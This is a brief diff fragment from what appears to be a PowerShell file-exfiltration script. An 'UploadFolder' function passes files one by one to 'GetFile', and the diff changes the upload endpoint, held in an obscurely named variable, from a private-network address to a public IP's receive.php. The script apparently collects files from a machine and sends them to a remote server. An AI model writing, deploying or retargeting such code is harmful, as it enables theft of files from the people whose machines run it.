@@ -28,7 +28,7 @@ function UploadFolder {
         GetFile $file.FullName $file.Name $k4
     }
 }
-$srsdf='http://172.20.101.20/receive.php'
+$srsdf='http://38.180.137.24/receive.php'
 function GetFile() {
 	param (
         $mytar,
